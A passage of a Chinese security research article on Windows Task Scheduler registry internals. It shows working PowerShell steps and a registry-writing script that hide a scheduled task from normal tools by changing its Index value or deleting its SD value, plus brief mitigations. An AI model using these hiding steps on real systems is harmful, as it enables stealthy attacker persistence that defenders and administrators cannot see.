+&lt;/Task&gt;</code></pre>
+
+
+<p>查阅 <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">MSDN</a> 可知，该参数可以通过以下 API 进行传递：</p>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-itaskhandler-start">ITaskHandler::Start</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iregisteredtask-run">IRegisteredTask::Run</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iregisteredtask-runex">IRegisteredTask::RunEx</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iexecaction-put_arguments">IExecAction::put_Arguments</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/mstask/nf-mstask-itask-setparameters">ITask::SetParameters</a></li>
+</ul>
+<h3 id="_7">计划任务相关注册表项</h3>
+<p>在一次应急排查中，只能从计划任务日志中看到恶意计划任务在周期性的执行，但却无法通过 taskschd.msc 或 schtasks 查询到恶意任务，并且通过排查 <code>%SystemRoot%\System32\Tasks</code> 目录后仍无法找到它。</p>
+<p>在测试中发现，创建计划任务 test 后，无论是手动修改任务 xml 文件，还是删除任务 xml 文件，都无法影响该任务的运行。于是对注册表项进行监控，发现在创建任务后，下面的注册表项发生变化：</p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule</code></pre>
+
+
+<p>下面是从 <a href="https://github.com/libyal/winreg-kb/blob/master/documentation/Task%20Scheduler%20Keys.asciidoc">winreg-kb</a> 项目中得到该注册表对应的信息：</p>
+<p>在 XP 时，计划任务注册表路径为 </p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\Software\Microsoft\SchedulingAgent</code></pre>
+
+
+<p>Win7 以后发生变化，变成 </p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule</code></pre>
+
+
+<p>子项有：</p>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Aliases</td>
+<td align="left">存储AtServiceAccount，默认NT AUTHORITY\System</td>
+</tr>
+<tr>
+<td align="left">CompatibilityAdapter</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Configuration</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">CredWom</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Handlers</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Handshake</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">TaskCache</td>
+<td align="left">存储任务项信息</td>
+</tr>
+</tbody>
+</table>
+<p>任务项信息除了在磁盘中的 <code>%SystemRoot%\System32\Tasks</code> 下之外，还在下面的注册表项中存在：</p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache</code></pre>
+
+
+<p>Schedule\TaskCache :</p>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Boot</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Logon</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Plain</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Plain</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Tree</td>
+<td align="left"></td>
+</tr>
+</tbody>
+</table>
+<p>TaskCache\Tree 子项以任务名称命名，每个任务下的 Value 结构如下：</p>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">类型</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Id</td>
+<td align="left">REG_SZ</td>
+<td align="left">{GUID}，任务对应的guid编号</td>
+</tr>
+<tr>
+<td align="left">Index</td>
+<td align="left">REG_DWORD</td>
+<td align="left">一般任务为3，其他值未知</td>
+</tr>
+<tr>
+<td align="left">SD</td>
+<td align="left">REG_BINARY</td>
+<td align="left">该任务项的安全描述信息，二进制值，结构未知</td>
+</tr>
+</tbody>
+</table>
+<p>每个 Schedule\TaskCache\Tasks\%GUID% 对应一个任务，有这些 Value :</p>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">类型</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Actions</td>
+<td align="left">REG_BINARY</td>
+<td align="left">二进制值，动作信息，中间包含 UNICODE 形式 COMMAND 信息</td>
+</tr>
+<tr>
+<td align="left">Date</td>
+<td align="left">REG_SZ</td>
+<td align="left">任务创建日期?</td>
+</tr>
+<tr>
+<td align="left">Description</td>
+<td align="left">REG_SZ</td>
+<td align="left">任务描述</td>
+</tr>
+<tr>
+<td align="left">DynamicInfo</td>
+<td align="left">REG_BINARY</td>
+<td align="left">Win7 以下 28 位，Win8 以上 32 位</td>
+</tr>
+<tr>
+<td align="left">Hash</td>
+<td align="left">REG_BINARY</td>
+<td align="left">SHA-256 or CRC32, 疑似对应 xml 文件 Hash</td>
+</tr>
+<tr>
+<td align="left">Path</td>
+<td align="left">REG_SZ</td>
+<td align="left">在 TaskCache\Tree 中的任务路径</td>
+</tr>
+<tr>
+<td align="left">Schema</td>
+<td align="left">REG_DWORD</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">Triggers</td>
+<td align="left">REG_BINARY</td>
+<td align="left">二进制，触发器信息</td>
+</tr>
+<tr>
+<td align="left">URI</td>
+<td align="left">REG_SZ</td>
+<td align="left">任务路径</td>
+</tr>
+</tbody>
+</table>
+<p>如果是 at 命令创建的计划任务，对应的注册表位置在 </p>
+<pre class="codehilite"><code>Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1</code></pre>
+
+
+<h3 id="sd">计划任务的安全描述符（SD）</h3>
+<p>计划任务的 SD 配置在注册表中的位置：</p>
+<pre class="codehilite"><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</code></pre>
+
+
+<p>为人类不可读的二进制格式：</p>
+<p><img alt="K67vSN" src="./windows 计划任务隐藏新姿势分享_files/1611218222000-12ssbch.png-w331s"></p>
+<p>在一篇关于隐藏windows服务的文章中，了解到通过修改对象的安全描述信息可以达到隐藏的目的。触类旁通一下，计划任务的隐藏应该也是可以通过改变安全描述信息（SD）实现。</p>
+<p>Windows 自带的工具 schtasks.exe 并不支持 sd 的设置，需要通过 API 实现。通过查阅 MSDN 并未发现对于 TASK 的 SDDL 该怎么写，相关 API 列表：
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iregistrationinfo-put_securitydescriptor">IRegistrationInfo::put_SecurityDescriptor</a>
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-itaskfolder-createfolder">ITaskFolder::CreateFolder</a>
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-itaskfolder-registertask">ITaskFolder::CreateFolder</a>
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-itaskfolder-registertaskdefinition">ITaskFolder::RegisterTaskDefinition</a>
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-itaskfolder-setsecuritydescriptor">ITaskFolder::SetSecurityDescriptor</a>
+- <a href="https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iregisteredtask-setsecuritydescriptor">IRegisteredTask::SetSecurityDescriptor</a></p>
+<p>通过这些 API 可以实现设置 TASK 的 SD 信息。我尝试使用项目 <a href="https://github.com/dahall/TaskScheduler">TaskScheduler</a> 进行任务的创建，它用起来会更方便一些：</p>
+<pre class="codehilite language-csharp"><code class=" language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span>
+<span class="token keyword">using</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Principal<span class="token punctuation">;</span>
+<span class="token keyword">using</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>AccessControl<span class="token punctuation">;</span>
+<span class="token keyword">using</span> Microsoft<span class="token punctuation">.</span>Win32<span class="token punctuation">.</span>TaskScheduler<span class="token punctuation">;</span>
+
+<span class="token keyword">namespace</span> SchTaskOpt
+<span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Program</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main<span class="token punctuation">(</span></span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            TaskDefinition td <span class="token operator">=</span> TaskService<span class="token punctuation">.</span>Instance<span class="token punctuation">.</span><span class="token function">NewTask<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>RegistrationInfo<span class="token punctuation">.</span>Description <span class="token operator">=</span> <span class="token string">"do something"</span><span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>Principal<span class="token punctuation">.</span>RunLevel <span class="token operator">=</span> TaskRunLevel<span class="token punctuation">.</span>Highest<span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>Principal<span class="token punctuation">.</span>LogonType <span class="token operator">=</span> TaskLogonType<span class="token punctuation">.</span>ServiceAccount<span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>Principal<span class="token punctuation">.</span>UserId <span class="token operator">=</span> <span class="token string">"SYSTEM"</span><span class="token punctuation">;</span>
+            td<span class="token punctuation">.</span>RegistrationInfo<span class="token punctuation">.</span>SecurityDescriptorSddlForm <span class="token operator">=</span> <span class="token string">@"D:P(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)"</span><span class="token punctuation">;</span>
+
+            DailyTrigger dt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DailyTrigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            dt<span class="token punctuation">.</span>StartBoundary <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now<span class="token punctuation">;</span>
+            dt<span class="token punctuation">.</span>DaysInterval <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            dt<span class="token punctuation">.</span>Repetition<span class="token punctuation">.</span>Interval <span class="token operator">=</span> TimeSpan<span class="token punctuation">.</span><span class="token function">FromMinutes<span class="token punctuation">(</span></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+           <span class="token comment" spellcheck="true"> //td.Triggers.Add(dt);
+</span>            td<span class="token punctuation">.</span>Actions<span class="token punctuation">.</span><span class="token function">Add<span class="token punctuation">(</span></span><span class="token string">"notepad"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Task t <span class="token operator">=</span>  TaskService<span class="token punctuation">.</span>Instance<span class="token punctuation">.</span>RootFolder<span class="token punctuation">.</span><span class="token function">RegisterTaskDefinition<span class="token punctuation">(</span></span>path<span class="token punctuation">:</span><span class="token string">"test2"</span><span class="token punctuation">,</span> definition<span class="token punctuation">:</span>td<span class="token punctuation">,</span> TaskCreation<span class="token punctuation">.</span>CreateOrUpdate<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> TaskLogonType<span class="token punctuation">.</span>ServiceAccount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Console<span class="token punctuation">.</span><span class="token function">WriteLine<span class="token punctuation">(</span></span><span class="token string">"success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token comment" spellcheck="true"> //TaskSecurity ts = new TaskSecurity(t);
+</span>           <span class="token comment" spellcheck="true"> //ts.AddAccessRule(new TaskAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), TaskRights.Read | TaskRights.Write | TaskRights.ReadAttributes, AccessControlType.Deny));
+</span>
+           <span class="token comment" spellcheck="true"> //t.SetAccessControl(ts);
+</span>
+            Console<span class="token punctuation">.</span><span class="token function">WriteLine<span class="token punctuation">(</span></span><span class="token string">"success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+
+
+<p>但不幸的是报错了，无论是通过管理员运行还是 SYSTEM，都无法另其正常运作：</p>
+<pre class="codehilite"><code class="language-powershell">PS C:\source\SchTaskOpt\bin\&gt; .\SchTaskOpt.exe
+
+未经处理的异常:  System.Runtime.InteropServices.COMException: 异常来自 HRESULT:0xD0000061
+   在 Microsoft.Win32.TaskScheduler.V2Interop.ITaskFolder.RegisterTaskDefinition(String Path, ITaskDefinition pDefinition, Int32 flags, Object UserId, Object password, TaskLogonType LogonType, Object sddl)
+   在 Microsoft.Win32.TaskScheduler.TaskFolder.RegisterTaskDefinition(String path, TaskDefinition definition, TaskCreation createType, String userId, String password, TaskLogonType logonType, String sddl)</code></pre>
+
+
+<p>这个疑问先保留一下吧，需要清楚知道注册表中每个任务自动生成的 SD 格式才有头绪，这份<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/">类型结构清点</a>也许会排上用场。</p>
+<h2 id="_8">计划任务隐藏新姿势</h2>
+<p>臆想一下，如果知道注册表里的所有结构形式及其意义，就可以手动通过添加注册表的方式进行创建计划任务，实际对该注册表项了解的并不是很清楚，所以只能做一些计划任务隐藏删除排查的工作。</p>
+<p>我对计划任务隐藏的手法进行深入探究，经过不断测试，发现两种隐藏任务的方式。</p>
+<h3 id="_9">非完全隐藏</h3>
+<p>如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 Index 值，一般情况下都是 3，步骤如下：</p>
+<ul>
+<li>启动 SYSTEM 权限 cmd：<code>psexec64  -i -s cmd.exe</code></li>
+<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
+<li>修改 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree</code> 下对应任务的 Index 值为 <code>0</code></li>
+<li>删除 <code>%SystemRoot%\System32\Tasks</code> 下任务对应的 XML 文件</li>
+</ul>
+<p>优点：
+- 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务</p>
+<p>缺点：
+- 并非完全隐藏，如果知道该任务的名字，可以通过 <code>schtasks /query /tn {TaskName}</code> 查到
+- 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</p>
+<h4 id="_10">测试用例</h4>
+<pre class="codehilite"><code class="language-powershell">PS C:\&gt; schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
+成功: 成功创建计划任务 "test"。
+PS C:\&gt; schtasks.exe /query /tn test
+
+文件夹: \
+任务名                                   下次运行时间           模式
+======================================== ====================== ===============
+test                                     2021/1/11 14:54:00     就绪
+PS C:\&gt; schtasks.exe /query|findstr test
+test                                     2021/1/11 14:55:00     ??
+PS C:\&gt; Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "Index" -Value 0
+PS C:\&gt; schtasks.exe /query|findstr test
+PS C:\&gt; schtasks.exe /delete /tn test /f
+成功: 计划的任务 "test" 被成功删除。
+PS C:\&gt;</code></pre>
+
+
+<h4 id="_11">原理探究</h4>
+<p>Index 的含义未知，这个暂时不做探讨。</p>
+<h3 id="_12">完全隐藏</h3>
+<p>按道理，是可以通过配置任务 SD 实现。在一次测试过程中，偶然删除了注册表中的 SD 项，发现无论什么方式都查不到任务信息，达到完全隐藏的目的：</p>
+<ul>
+<li>启动 SYSTEM 权限 cmd：<code>psexec64  -i -s cmd.exe</code></li>
+<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
+<li>删除 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</code></li>
+<li>删除 <code>%SystemRoot%\System32\Tasks</code> 下任务对应的 XML 文件</li>
+</ul>
+<p>优点：
+- 无论何种方式（除了注册表），都查不到该任务，较为彻底</p>
+<p>缺点：
+- 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</p>
+<h4 id="_13">测试用例</h4>
+<p>下面是测试用的 powershell 代码（不通用，里面涉及的二进制内容需要先dump一个正常创建的任务）：</p>
+<pre class="codehilite"><code class="language-powershell">$taskname = "test"
+$uuid = "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}"
+$cmd = "calc.exe"
+
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\" -Name $uuid
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Path" -Value "\$taskname" -Type String -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "URI" -Value "\$taskname" -Type String -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Schema" -Value 0x00010002 -Type DWORD -Force
+
+$triggerstring = "FwAAAAAAAAABBwEAAAAIAAAI/NDz5dYBAAcBAAAACAD//////////zghQUNISEhI38PL80hISEgOAAAASEhISEEAdQB0AGgAbwByAAAASEgAAAAASEhISABISEhISEhIAEhISEhISEgBAAAASEhISBwAAABISEhIAQUAAAAAAAUVAAAAEXy5KUkCH0AHyc8n6AMAAEhISEgsAAAASEhISFQARQBDAEgATABJAFUAMQAwADUANwBcAHQAZQBjAGgAbABpAHUAAAAAAAAASEhISCwAAABISEhIWAIAABAOAACA9AMA/////wcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABISEhI3d0AAAAAAAABBwEAAAAIAAAI/NDz5dYBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAP////8AAAAAAAAAAAAAAAAAAcVLAQAAAAAAAAB2oQAAAAAAAEhISEg="
+$triggerbytes = [System.Convert]::FromBase64String($triggerstring)
+$actionbytes = [byte[]](0x03,0x00,0x0c,0x00,0x00,0x00,0x41,0x00,0x75,0x00,0x74,0x00,0x68,0x00,0x6f,0x00,0x72,0x00,0x66,0x66,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00) + [System.Text.Encoding]::Unicode.GetBytes($cmd) + [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
+
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Triggers" -Value $triggerbytes -Type binary -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid\" -Name "Actions" -Value $actionbytes -Type binary -Force
+
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" -Name $taskname -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id" -Value "{3EC79FBB-0533-4356-89B3-8CE2003F1CD8}" -Type string -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Index" -Value 0x3 -Type DWORD -Force
+
+#Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Force
+#Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid" -Force</code></pre>
+
+
+<p>更通用一些的测试用例：</p>
+<pre class="codehilite"><code class="language-powershell">PS C:\&gt; schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
+成功: 成功创建计划任务 "test"。
+PS C:\&gt; schtasks.exe /query /tn test
+
+文件夹: \
+任务名                                   下次运行时间           模式
+======================================== ====================== ===============
+test                                     2021/1/11 14:56:00     就绪
+PS C:\&gt; schtasks.exe /query|findstr test
+test                                     2021/1/11 14:56:00     ??
+PS C:\&gt; Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test" -Name "SD"
+PS C:\&gt; schtasks.exe /query /tn test
+错误: 系统找不到指定的文件。
+PS C:\&gt; schtasks.exe /query|findstr test
+PS C:\&gt;</code></pre>
+
+
+<p>这种方式创建的计划任务，删除要相对麻烦一些：</p>
+<pre class="codehilite"><code class="language-powershell">$taskname = "test"
+$uuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname" -Name "Id").Id
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$uuid"
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskname"
+
+sc.exe stop schedule
+sc.exe start schedule</code></pre>
+
+
+<h4 id="_14">原理探究</h4>
+<p>经过进程监控，发现在计划任务信息查询过程中的流程如下：</p>
+<ul>
+<li>查询 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SD</code>，查的到继续，查不到则终止查询</li>
+<li>遍历查询 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}</code> 中的 Id、Index、SD等值</li>
+<li>（后面都是猜测）</li>
+<li>查询到的 SD 值，会对之后是否有权限查看该任务信息有影响，查不查的到和这个值息息相关</li>
+<li>根据 SD 值，进行权限检查<ul>
+<li>如果权限通过，格式化输出 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{TaskId}</code> 中的任务详细信息</li>
+<li>权限不通过，则进行下一个任务的查询</li>
+</ul>
+</li>
+</ul>
+<p>正常任务查询：
+<img alt="12Wb6Q" src="./windows 计划任务隐藏新姿势分享_files/1611218223000-13amukn.png-w331s"></p>
+<p>删除 SD 后的任务查询：
+<img alt="BWCGeE" src="./windows 计划任务隐藏新姿势分享_files/1611218224000-14zhnos.png-w331s"></p>
+<p>可见，因为找不到任务的 SD 信息，无法确定用户是否有权限查看该任务信息，导致系统直接判定无权限查看：</p>
+<p><img alt="kyXkGN" src="./windows 计划任务隐藏新姿势分享_files/1611218224000-15iteph.png-w331s"></p>
+<h2 id="_15">缓解计划任务的恶意利用</h2>
+<ol>
+<li>配置计划任务只允许运行在认证用户上，不可以通过 SYSTEM 账户运行，可以在 GPO 中进行配置，参考 <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj852168(v=ws.11)?redirectedfrom=MSDN">Allow server operators to schedule tasks</a></li>
+<li>配置只允许 administrators 用户组对进程的优先级进行修改，可以在 GPO 中配置，参考 <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn221960(v=ws.11)?redirectedfrom=MSDN">Increase scheduling priority</a></li>
+</ol>
+<h2 id="_16">参考</h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page</a></p>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/application-management/svchost-service-refactoring">https://docs.microsoft.com/en-us/windows/application-management/svchost-service-refactoring</a></p>
+<p><a href="https://nasbench.medium.com/a-deep-dive-into-windows-scheduled-tasks-and-the-processes-running-them-218d1eed4cce">https://nasbench.medium.com/a-deep-dive-into-windows-scheduled-tasks-and-the-processes-running-them-218d1eed4cce</a></p>
+<p><a href="https://attack.mitre.org/techniques/T1053/002/">https://attack.mitre.org/techniques/T1053/002/</a></p>
+<p><a href="https://attack.mitre.org/techniques/T1053/005/">https://attack.mitre.org/techniques/T1053/005/</a></p>
+<p><a href="https://github.com/libyal/winreg-kb/blob/master/documentation/Task%20Scheduler%20Keys.asciidoc">https://github.com/libyal/winreg-kb/blob/master/documentation/Task%20Scheduler%20Keys.asciidoc</a></p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/</a></p>
+<p><a href="https://github.com/dahall/TaskScheduler">https://github.com/dahall/TaskScheduler</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page</a></p>
+        
+<hr>
+<p><img src="./windows 计划任务隐藏新姿势分享_files/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/1464/">https://paper.seebug.org/1464/</a></p>
+            
+    </section>
+
+    <nav class="pagination" role="navigation" style="padding: 3rem;">
+        
+        <a class="newer-posts" href="https://paper.seebug.org/1463/"><span aria-hidden="true">←</span>
+            CVE-2021-1648 windows10 spl...
+        </a>
+
+        
+        
+        <a class="older-posts" href="https://paper.seebug.org/1465/">Fuzzing 战争系列之二：不畏浮云遮望眼 <span aria-hidden="true">→</span></a>
+        
+    </nav>
+
+
+    
+
+    
+    <footer class="post-footer">
+        <figure class="author-image">
+            <a class="img" href="https://paper.seebug.org/users/author/?nickname=%E9%9D%92%E8%97%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4" style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span class="hidden">'s Picture</span></a>r
+        </figure>
+
+        <section class="author">
+            <h4><a href="https://paper.seebug.org/users/author/?nickname=%E9%9D%92%E8%97%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4">青藤实验室</a>
+            </h4>
+            <p class="author-desc"><span>None</span></p>
+            <p>阅读更多有关<a href="https://paper.seebug.org/users/author/?nickname=%E9%9D%92%E8%97%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4">该作者</a>的文章
+            </p>
+            
+            <div class="author-meta">
+            </div>
+        </section>
+
+
+    </footer>
+    
+    
+    <br>
+
+    <section class="plugin_comment">
+        <div class="error-box">
+
+        </div>
+
+        <!--评论表单 begin-->
+        <form action="https://paper.seebug.org/1464/" class="comment-form" id="j-comment-form" data-vul-id="" style="margin-bottom: 20px;">
+            <input type="hidden" name="csrfmiddlewaretoken" value="FmA8D038L6akhurhTG9sZvOKgqfgc2zHQrgo3g2NIheDoEn1NbYRjiymMYRHonUV">
+            <div class="row">
+                <div class="col-md-offset-1">
+                    <div class="col-md-5" style="margin-bottom: 20px">
+                        <div class="input-group">
+                            <span class="input-group-addon" id="basic-addon1">昵称</span>
+                            <input type="text" class="form-control" placeholder="昵称(必填)" aria-describedby="basic-addon1" name="nickname" id="nickname">
+                        </div>
+                    </div>
+                    <div class="col-md-6" style="margin-bottom: 20px">
+                        <div class="input-group">
+                            <span class="input-group-addon" id="basic-addon1">邮箱</span>
+                            <input type="email" class="form-control" placeholder="邮箱(必填)" aria-describedby="basic-addon1" id="email" name="email">
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-1 hidden-xs">
+                    <img src="./windows 计划任务隐藏新姿势分享_files/anonymous.jpg" alt="" class="avatar-b img-circle">
+                </div>
+                <div class="col-md-11">
+                    <div class="input-group">
+                                <textarea id="comment_content" cols="30" rows="10" style="resize: none" placeholder="请多说一点吧(10个字以上)" class="form-control"></textarea>
+                        <span class="input-group-btn">
+                    <button type="button" class="btn btn-brand-fill btn-submit-comment post-comment" name="post-comment" id="post-comment">提交评论</button>
+                  </span>
+                    </div>
+                    <span style="color: red;font-size: 13px">* 注意:请正确填写邮箱，消息将通过邮箱通知！</span>
+                </div>
+            </div>
+        </form>
+        <!--评论表单 end-->
+        
+        <!--评论列表 begin-->
+        <ul class="list-unstyled comment-list" id="j-comment-list">
+            
+            <li id="774">
+                <div class="clearfix">
+                    <div class="pull-left">
+
+                        
+                        <img src="./windows 计划任务隐藏新姿势分享_files/anonymous.jpg" class="avatar-b img-circle">
+                        
+
+                    </div>
+                    <div class="pull-left  comment-wrapper">
+                        <div class="user-info">
+                            
+                            <a class="user-name">[匿名用户]: skyxuan</a>
+                            
+                            <i class="sebug-icon icon-user-level-0"></i>
+
+                            <time>2021-03-02</time>
+                        </div>
+                        <div class="comment-content">
+                            我本地测试之后发现直接把注册表项下的HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\任务计划名项直接给删除之后貌似计划任务也还在运行的，现在直接没方法找到了
+
+                        </div>
+
+
+                        <!--回复列表 begin-->
+                        <ul class="list-unstyled reply-list">
+                            
